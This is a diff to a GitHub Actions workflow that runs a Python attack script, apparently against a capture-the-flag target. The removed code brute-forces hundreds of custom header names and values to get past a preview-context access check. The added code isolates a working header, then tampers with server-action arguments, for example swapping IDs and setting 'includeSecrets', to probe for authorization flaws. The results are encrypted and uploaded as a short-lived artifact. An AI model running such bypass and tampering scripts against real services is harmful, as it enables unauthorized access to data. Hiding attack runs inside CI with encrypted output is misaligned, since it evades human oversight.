@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Bulk probe transport marker headers and encrypt differential hits
+      - name: Isolate exact preview-context header and inspect action arguments
         shell: bash
         run: |
           set -euo pipefail
@@ -30,34 +30,40 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests, pathlib, urllib.parse, json, itertools
+          import requests, pathlib, urllib.parse, json
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
           boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
-          url=urllib.parse.urljoin(base,act['endpoint']); body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
-          baseh={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}
-          prefixes=['X-Launchlet','Launchlet','X-Preview','Preview','X-LL','LL','X-Deploy','Deploy']
-          suffixes=['Preview','Context','Preview-Context','Client','Client-Context','Client-Mode','Preview-Mode','Session','Preview-Session','Runtime','Runtime-Context','Source','Preview-Source','Request-Context','Request','Preview-Request','Studio','Studio-Context','Environment','Preview-Environment','Stage','Role','Preview-Role','Mode','Capability','Preview-Capability','Scope','Preview-Scope','Origin','Preview-Origin','Build','Project','Workspace','Server-Reference','Server-Context','Action','Action-Context','Deploy','Deploy-Context','Token','Preview-Token','Context-Token','Context-Id','Internal','Internal-Preview','Internal-Context','Live-Preview','Preview-Client','Preview-Runtime','Auth','Preview-Auth','Key','Preview-Key']
-          names=[]
-          for p,sf in itertools.product(prefixes,suffixes): names.append(p+'-'+sf)
-          names += ['X-Requested-With','Requested-With','Purpose','Sec-Purpose','X-Client-Context','Client-Context','X-Runtime-Context','Runtime-Context','X-Preview-Context','Preview-Context','X-Launchlet-Preview-Context']
-          names=list(dict.fromkeys(names))
-          batches=[names[i:i+70] for i in range(0,len(names),70)]
-          values=[
-            'preview','1','true','enabled','active','yes','on','open','allow','allowed','guest','public','studio','browser','live','sandbox','internal','trusted','preview-board','preview-studio','live-preview','preview_guest','preview_guest_session',
-            boot['client']['session'],boot['client']['anonKey'],boot['project'],boot['workspace'],mf['build'],mf['previewReceipt'],act['id'],refs['runtime'],refs['generatedAt'],'preview:guest','preview:public','preview:receipt:read','Launchlet','rc3','2026'
+          url=urllib.parse.urljoin(base,act['endpoint']); project=boot['project']; workspace=boot['workspace']
+          baseh={'Accept':'application/json','Content-Type':'application/json'}
+          names=[
+            'X-Launchlet-Preview','X-Launchlet-Context','X-Launchlet-Preview-Context','X-Launchlet-Client','X-Launchlet-Client-Context','X-Launchlet-Client-Mode','X-Launchlet-Preview-Mode','X-Launchlet-Session','X-Launchlet-Preview-Session','X-Launchlet-Runtime','X-Launchlet-Runtime-Context','X-Launchlet-Source','X-Launchlet-Preview-Source','X-Launchlet-Request-Context','X-Launchlet-Request','X-Launchlet-Preview-Request','X-Launchlet-Studio','X-Launchlet-Studio-Context','X-Launchlet-Environment','X-Launchlet-Preview-Environment','X-Launchlet-Stage','X-Launchlet-Role','X-Launchlet-Preview-Role','X-Launchlet-Mode','X-Launchlet-Capability','X-Launchlet-Preview-Capability','X-Launchlet-Scope','X-Launchlet-Preview-Scope','X-Launchlet-Origin','X-Launchlet-Preview-Origin','X-Launchlet-Build','X-Launchlet-Project','X-Launchlet-Workspace','X-Launchlet-Server-Reference','X-Launchlet-Server-Context','X-Launchlet-Action','X-Launchlet-Action-Context','X-Launchlet-Deploy','X-Launchlet-Deploy-Context','X-Launchlet-Token','X-Launchlet-Preview-Token','X-Launchlet-Context-Token','X-Launchlet-Context-Id','X-Launchlet-Internal','X-Launchlet-Internal-Preview','X-Launchlet-Internal-Context','X-Launchlet-Live-Preview','X-Launchlet-Preview-Client','X-Launchlet-Preview-Runtime','X-Launchlet-Auth','X-Launchlet-Preview-Auth','X-Launchlet-Key','X-Launchlet-Preview-Key','Launchlet-Preview','Launchlet-Context','Launchlet-Preview-Context','Launchlet-Client','Launchlet-Client-Context','Launchlet-Client-Mode','Launchlet-Preview-Mode','Launchlet-Session','Launchlet-Preview-Session','Launchlet-Runtime','Launchlet-Runtime-Context','Launchlet-Source','Launchlet-Preview-Source','Launchlet-Request-Context','Launchlet-Request','Launchlet-Preview-Request','Launchlet-Studio'
           ]
-          values=list(dict.fromkeys(values)); baseline=(403,'{"error":"preview_context_required"}'); hits=[]; tries=0
-          for bi,batch in enumerate(batches):
-            for val in values:
-              tries+=1; h={**baseh,**{n:val for n in batch}}
-              try:r=s.post(url,headers=h,json=body,timeout=10,allow_redirects=False)
-              except Exception as e: continue
-              if (r.status_code,r.text.strip())!=baseline:
-                hits.append({'batch':bi,'names':batch,'value':val,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-                if r.status_code==200 or 'caplag{' in r.text: break
-            if hits and any(x['status']==200 or 'caplag{' in x['body'] for x in hits): break
-          (out/'summary.json').write_text(json.dumps({'name_count':len(names),'batch_count':len(batches),'tries':tries,'hits':hits},indent=2))
+          basebody={'actionId':act['id'],'args':{'workspaceId':workspace,'projectId':project}}
+          winners=[]
+          for h in names:
+              r=s.post(url,headers={**baseh,h:project},json=basebody,timeout=10,allow_redirects=False)
+              if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}':
+                  winners.append({'header':h,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+          result={'winners':winners,'arg_tests':[]}
+          # If exactly one usable header, probe argument trust boundary using only public values and returned deployRef.
+          good=next((x for x in winners if x['status']==200),None)
+          if good:
+              h=good['header']; first=json.loads(good['body']); deploy_ref=first.get('inspector',{}).get('deployRef')
+              tests=[
+                ('baseline',{'workspaceId':workspace,'projectId':project}),
+                ('empty',{}),('only_project',{'projectId':project}),('only_workspace',{'workspaceId':workspace}),
+                ('project_deployref',{'workspaceId':workspace,'projectId':deploy_ref}),('workspace_deployref',{'workspaceId':deploy_ref,'projectId':project}),
+                ('extra_deployRef',{'workspaceId':workspace,'projectId':project,'deployRef':deploy_ref}),('extra_ref',{'workspaceId':workspace,'projectId':project,'ref':deploy_ref}),
+                ('extra_build',{'workspaceId':workspace,'projectId':project,'build':mf['build']}),('extra_mode_deploy',{'workspaceId':workspace,'projectId':project,'mode':'deploy'}),
+                ('extra_export',{'workspaceId':workspace,'projectId':project,'export':True}),('extra_include',{'workspaceId':workspace,'projectId':project,'includeSecrets':True}),
+                ('project_empty',{'workspaceId':workspace,'projectId':''}),('workspace_empty',{'workspaceId':'','projectId':project}),
+                ('project_workspace',{'workspaceId':workspace,'projectId':workspace}),('workspace_project',{'workspaceId':project,'projectId':project}),
+              ]
+              for name,args in tests:
+                  r=s.post(url,headers={**baseh,h:project},json={'actionId':act['id'],'args':args},timeout=10,allow_redirects=False)
+                  result['arg_tests'].append({'name':name,'args':args,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+          (out/'summary.json').write_text(json.dumps(result,indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -73,6 +79,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-header-encrypted
+          name: launchlet-part2-isolate-encrypted
           path: artifact/
           retention-days: 1
